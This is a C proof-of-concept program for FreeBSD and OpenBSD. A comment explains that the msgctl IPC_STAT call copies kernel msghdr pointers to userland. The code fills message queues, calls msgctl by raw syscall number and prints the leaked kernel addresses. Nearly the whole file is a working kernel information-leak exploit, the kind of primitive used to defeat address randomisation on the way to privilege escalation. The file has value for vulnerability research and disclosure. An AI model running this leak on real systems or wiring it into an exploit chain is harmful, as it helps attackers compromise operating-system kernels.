//In the msgctl syscall, the kernel copies a the msqid_ds structure to userland
//when the IPC_STAT command is given (see kern_msgctl in sys/kern/sysv_msg.c).
//Inside of the copied structure, is two pointers to the msghdr struct that
//represents the message in kernel memory. These pointers are included in the
//copied structure, and thus we can leak the kernel pointers via the
//msqid_ds.msg_first and msqid_ds.msg_last fields.

#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/msg.h>
#include <sys/syscall.h>

int main(int argc, char ** argv)
{
	int i, * mqs;
	int max = 1;
	int allocated = 0;
	struct msqid_ds m;
	char buffer[32];

	if(argc > 1)
		max = atoi(argv[1]);
	mqs = (int *)calloc(max, sizeof(int));

	memset(buffer, 0x41, sizeof(buffer));

	for(i = 0; i < max; i++)
	{
		//Allocate a new message queue
		mqs[i] = msgget(IPC_PRIVATE, IPC_CREAT|IPC_R|IPC_W|IPC_M);
		if(mqs[i] < 0) {
			printf("msgget failed (errno %d: %s)\n", errno, strerror(errno));
			return 1;
		}
		allocated++;

		//Put two messages in the queue to fill msg_first and msg_last
		if(msgsnd(mqs[i], buffer, sizeof(buffer) - sizeof(long), 0) < 0 ||
				msgsnd(mqs[i], buffer, sizeof(buffer) - sizeof(long), 0) < 0) {
			printf("msgsnd failed (errno %d: %s)\n", errno, strerror(errno));
			return 1;
		}
	}

	//Read all of the msg_first and msg_last fields
	for(i = 0; i < max; i++)
	{
		memset(&m, 0xAA, sizeof(m));
#ifdef __FreeBSD__
		if(__syscall(511, mqs[i], IPC_STAT, &m) < 0) { //511 = msgctl
#else //OpenBSD
		if(syscall(297, mqs[i], IPC_STAT, &m) < 0) { //297 = msgctl
#endif
			printf("msgctl failed (errno %d: %s)\n", errno, strerror(errno));
		} else {
#ifdef __FreeBSD__
			printf("msqid_ds.msg_first = %p\n", m.__msg_first);
			printf("msqid_ds.msg_last = %p\n", m.__msg_last);
#else //OpenBSD
			printf("msqid_ds.msg_first = %p\n", m.msg_first);
			printf("msqid_ds.msg_last = %p\n", m.msg_last);
#endif
		}
	}

	//Clean up the message queues
	for(i = 0; i < max && i < allocated; i++)
	{
		if(msgctl(mqs[i], IPC_RMID, NULL) < 0) {
			printf("msgctl to remove the msg queue failed (errno %d: %s)\n", errno, strerror(errno));
			return 1;
		}
	}

	return 0;
}
